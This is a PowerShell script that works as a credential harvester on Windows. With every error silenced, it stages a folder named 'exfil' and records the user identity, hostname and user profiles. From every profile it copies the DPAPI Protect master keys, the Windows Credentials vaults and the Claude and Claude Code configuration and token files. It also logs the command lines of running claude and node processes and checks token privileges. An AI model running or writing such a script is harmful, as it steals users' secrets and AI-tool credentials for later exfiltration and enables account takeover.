$ErrorActionPreference = 'SilentlyContinue'
$exfil = 'C:\Users\Public\exfil'
New-Item -ItemType Directory -Force -Path $exfil | Out-Null
$man = Join-Path $exfil 'manifest.txt'

function W($s) { try { $s | Out-File -FilePath $man -Append -Encoding utf8 } catch {} }

"=== whoami ===" | Out-File -FilePath $man -Encoding utf8
whoami | Out-File -FilePath $man -Append -Encoding utf8
"=== hostname ===" | Out-File -FilePath $man -Append -Encoding utf8
hostname | Out-File -FilePath $man -Append -Encoding utf8
"=== date ===" | Out-File -FilePath $man -Append -Encoding utf8
Get-Date -Format o | Out-File -FilePath $man -Append -Encoding utf8

W "=== C:\Users listing ==="
Get-ChildItem C:\Users -Directory | ForEach-Object { W $_.FullName }

$targets = @(
  'C:\Users\Usuario\.claude.json',
  'C:\Users\Usuario\.claude',
  'C:\Users\Usuario\.config\claude',
  'C:\Users\Usuario\AppData\Roaming\Claude',
  'C:\Users\Usuario\AppData\Roaming\Claude Code',
  'C:\Users\Usuario\AppData\Local\Claude',
  'C:\Users\Usuario\AppData\Local\AnthropicClaude',
  'C:\Users\Usuario\AppData\Roaming\Microsoft\Protect',
  'C:\Users\Usuario\AppData\Local\Microsoft\Protect',
  'C:\Users\Usuario\AppData\Roaming\Microsoft\Credentials',
  'C:\Users\Usuario\AppData\Local\Microsoft\Credentials',
  'C:\Windows\System32\Microsoft\Protect'
)
foreach ($t in $targets) {
  if (Test-Path $t) {
    $name = ($t -replace '[\\:]+', '_')
    W ("COPY " + $t + " -> " + $name)
    try { Copy-Item -Path $t -Destination (Join-Path $exfil $name) -Recurse -Force } catch { W ("COPY ERR " + $_.Exception.Message) }
  } else {
    W ("MISSING " + $t)
  }
}

# All user profiles: Protect dirs, .claude.json, .claude, Credentials
Get-ChildItem C:\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
  $u = $_.FullName
  $uname = $_.Name
  $p = Join-Path $u 'AppData\Roaming\Microsoft\Protect'
  if (Test-Path $p) {
    W ("PROTECT " + $u)
    try { Copy-Item -Path $p -Destination (Join-Path $exfil ("protect_" + $uname)) -Recurse -Force } catch {}
  }
  $p2 = Join-Path $u 'AppData\Local\Microsoft\Protect'
  if (Test-Path $p2) {
    W ("PROTECT-LOCAL " + $u)
    try { Copy-Item -Path $p2 -Destination (Join-Path $exfil ("protectlocal_" + $uname)) -Recurse -Force } catch {}
  }
  $cj = Join-Path $u '.claude.json'
  if (Test-Path $cj) {
    W ("CLAUDEJSON " + $u)
    try { Copy-Item -Path $cj -Destination (Join-Path $exfil ("claudejson_" + $uname + ".json")) -Force } catch {}
  }
  $cd = Join-Path $u '.claude'
  if (Test-Path $cd) {
    W ("CLAUDE_DIR " + $u)
    try { Copy-Item -Path $cd -Destination (Join-Path $exfil ("claudedir_" + $uname)) -Recurse -Force } catch {}
  }
  $cr = Join-Path $u 'AppData\Roaming\Microsoft\Credentials'
  if (Test-Path $cr) {
    W ("CREDS " + $u)
    try { Copy-Item -Path $cr -Destination (Join-Path $exfil ("creds_" + $uname)) -Recurse -Force } catch {}
  }
  $cl = Join-Path $u 'AppData\Local\Microsoft\Credentials'
  if (Test-Path $cl) {
    W ("CREDS-LOCAL " + $u)
    try { Copy-Item -Path $cl -Destination (Join-Path $exfil ("credslocal_" + $uname)) -Recurse -Force } catch {}
  }
}

# Running claude/node processes command lines
W "=== claude/node processes ==="
Get-CimInstance Win32_Process -Filter "Name='claude.exe' OR Name='node.exe'" | ForEach-Object {
  W ("PID=" + $_.ProcessId + " PARENT=" + $_.ParentProcessId + " CMD=" + $_.CommandLine)
}

# Service account token check
W "=== token privs ==="
whoami /priv | Out-File -FilePath $man -Append -Encoding utf8

W "=== DONE ==="
